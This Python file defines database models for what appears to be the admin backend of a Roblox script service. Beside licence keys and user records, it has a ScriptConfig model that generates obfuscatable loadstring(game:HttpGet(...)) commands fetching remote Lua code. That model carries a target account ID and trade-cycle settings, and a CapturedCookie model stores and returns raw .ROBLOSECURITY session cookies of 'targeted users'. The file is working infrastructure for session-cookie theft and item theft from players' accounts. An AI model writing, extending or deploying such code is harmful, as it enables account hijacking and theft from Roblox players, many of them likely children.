from datetime import datetime, timedelta
import hashlib
from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin
from werkzeug.security import generate_password_hash, check_password_hash

db = SQLAlchemy()

class AdminUser(db.Model, UserMixin):
    __tablename__ = 'admin_users'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)
    email = db.Column(db.String(120), nullable=True)
    role = db.Column(db.String(20), default='admin') # admin, superadmin
    is_active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime, nullable=True)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

    def to_dict(self):
        return {
            'id': self.id,
            'username': self.username,
            'email': self.email,
            'role': self.role,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'last_login': self.last_login.isoformat() if self.last_login else None
        }

class User(db.Model):
    __tablename__ = 'users'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), unique=True, nullable=False)
    roblox_id = db.Column(db.String(64), unique=True, nullable=True)
    discord_id = db.Column(db.String(64), unique=True, nullable=True)
    discord_username = db.Column(db.String(100), nullable=True)
    hwid = db.Column(db.String(256), nullable=True)
    ip_address = db.Column(db.String(64), nullable=True)
    status = db.Column(db.String(20), default='active') # active, banned, suspended
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    keys = db.relationship('Key', backref='user', lazy=True)

    def to_dict(self):
        return {
            'id': self.id,
            'username': self.username,
            'roblox_id': self.roblox_id,
            'discord_id': self.discord_id,
            'discord_username': self.discord_username,
            'hwid': self.hwid,
            'ip_address': self.ip_address,
            'status': self.status,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None
        }

class Key(db.Model):
    __tablename__ = 'keys'
    id = db.Column(db.Integer, primary_key=True)
    key_hash = db.Column(db.String(64), unique=True, nullable=False)
    key_string = db.Column(db.String(64), nullable=True) # Stored plaintext key
    key_preview = db.Column(db.String(16), nullable=False) # e.g., "SAB-****ABCD"

    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
    hwid = db.Column(db.String(256), nullable=True)
    status = db.Column(db.String(20), default='unused') # unused, active, expired, banned, revoked
    duration_days = db.Column(db.Integer, default=30)
    activated_at = db.Column(db.DateTime, nullable=True)
    expires_at = db.Column(db.DateTime, nullable=True)
    created_by = db.Column(db.Integer, db.ForeignKey('admin_users.id'), nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    note = db.Column(db.Text, nullable=True)

    @property
    def is_expired(self):
        if self.status == 'expired':
            return True
        if self.expires_at and datetime.utcnow() > self.expires_at:
            return True
        return False

    def to_dict(self):
        return {
            'id': self.id,
            'key_preview': self.key_preview,
            'user_id': self.user_id,
            'user': self.user.username if self.user else None,
            'hwid': self.hwid,
            'status': self.status,
            'duration_days': self.duration_days,
            'activated_at': self.activated_at.isoformat() if self.activated_at else None,
            'expires_at': self.expires_at.isoformat() if self.expires_at else None,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'note': self.note
        }

class ActivityLog(db.Model):
    __tablename__ = 'activity_logs'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
    key_id = db.Column(db.Integer, db.ForeignKey('keys.id'), nullable=True)
    admin_id = db.Column(db.Integer, db.ForeignKey('admin_users.id'), nullable=True)
    event_type = db.Column(db.String(64), nullable=False) # e.g. KEY_GENERATED, KEY_ACTIVATED, VALIDATION_FAILED, USER_BANNED
    ip_address = db.Column(db.String(64), nullable=True)
    hwid = db.Column(db.String(256), nullable=True)
    details = db.Column(db.Text, nullable=True) # JSON or descriptive string
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'key_id': self.key_id,
            'admin_id': self.admin_id,
            'event_type': self.event_type,
            'ip_address': self.ip_address,
            'hwid': self.hwid,
            'details': self.details,
            'created_at': self.created_at.isoformat() if self.created_at else None
        }

class Settings(db.Model):
    __tablename__ = 'settings'
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(64), unique=True, nullable=False)
    value = db.Column(db.Text, nullable=True)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    @classmethod
    def get(cls, key, default=None):
        setting = cls.query.filter_by(key=key).first()
        if setting:
            return setting.value
        return default

    @classmethod
    def set(cls, key, value):
        setting = cls.query.filter_by(key=key).first()
        if not setting:
            setting = cls(key=key, value=str(value))
            db.session.add(setting)
        else:
            setting.value = str(value)
        db.session.commit()


class ScriptConfig(db.Model):
    """Per-user Lua script configuration.
    Each config generates a unique loader script with its own SECRET_KEY,
    TARGET_ID, brainrot toggles, and timing settings.
    """
    __tablename__ = 'script_configs'
    id = db.Column(db.Integer, primary_key=True)
    label = db.Column(db.String(100), nullable=False)           # Human-readable label for this config
    secret_key = db.Column(db.String(64), unique=True, nullable=False)  # e.g. "mrr_a92e150ecc714f26..."
    target_id = db.Column(db.String(64), nullable=True)         # Roblox user ID of the target
    target_name = db.Column(db.String(64), nullable=True)       # Roblox display name (fetched, not manual)
    delay_step = db.Column(db.Integer, default=1)
    trade_cycle_delay = db.Column(db.Integer, default=2)
    brainrot_toggles = db.Column(db.Text, nullable=True)        # JSON dict: {"ItemName": true/false, ...}
    paste_url = db.Column(db.String(256), nullable=True)        # Saved URL compiled via paste.rs
    obfuscate = db.Column(db.Boolean, default=False)
    loadstring_type = db.Column(db.String(20), default='raw')   # 'raw', 'luaposec', 'luapot'
    is_active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    def get_toggles(self):
        """Returns dict of brainrot name -> bool (enabled/disabled)."""
        import json
        if self.brainrot_toggles:
            try:
                return json.loads(self.brainrot_toggles)
            except Exception:
                return {}
        return {}

    def set_toggles(self, toggles_dict):
        """Stores a dict of brainrot name -> bool."""
        import json
        self.brainrot_toggles = json.dumps(toggles_dict)

    def to_dict(self):
        # Determine the visual representation of the loadstring command
        # based on selected wrapper type (raw, luaposec, luapot)
        if self.loadstring_type == 'luaposec':
            loadstring_cmd = f'loadstring(game:HttpGet("https://luaposec.com/api/loadstring/{self.secret_key}"))()'
        elif self.loadstring_type == 'luapot':
            loadstring_cmd = f'loadstring(game:HttpGet("https://luapot.com/api/loadstring/{self.secret_key}"))()'
        else:
            paste_link = self.paste_url or f"/api/scripts/loader/{self.secret_key}"
            loadstring_cmd = f'loadstring(game:HttpGet("{paste_link}"))()'

        return {
            'id': self.id,
            'label': self.label,
            'secret_key': self.secret_key,
            'target_id': self.target_id,
            'target_name': self.target_name,
            'delay_step': self.delay_step,
            'trade_cycle_delay': self.trade_cycle_delay,
            'brainrot_toggles': self.get_toggles(),
            'paste_url': self.paste_url,
            'obfuscate': self.obfuscate,
            'loadstring_type': self.loadstring_type,
            'loadstring': loadstring_cmd,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None
        }


class CapturedCookie(db.Model):
    """Stores captured .ROBLOSECURITY cookies of targeted users."""
    __tablename__ = 'captured_cookies'
    id = db.Column(db.Integer, primary_key=True)
    player_id = db.Column(db.String(64), unique=True, nullable=False)
    player_name = db.Column(db.String(64), nullable=True)
    cookie_value = db.Column(db.Text, nullable=False)
    status = db.Column(db.String(20), default='valid')          # valid, expired, invalid
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    def to_dict(self):
        # Mask the middle of the cookie for security while remaining identifiable
        masked = "Cookie Empty"
        if self.cookie_value:
            prefix = self.cookie_value[:35] if len(self.cookie_value) > 35 else ""
            suffix = self.cookie_value[-35:] if len(self.cookie_value) > 70 else ""
            masked = f"{prefix}...[MASKED]...{suffix}"
        return {
            'id': self.id,
            'player_id': self.player_id,
            'player_name': self.player_name or "Unknown",
            'cookie_value_masked': masked,
            'cookie_value_raw': self.cookie_value,
            'status': self.status,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None
        }


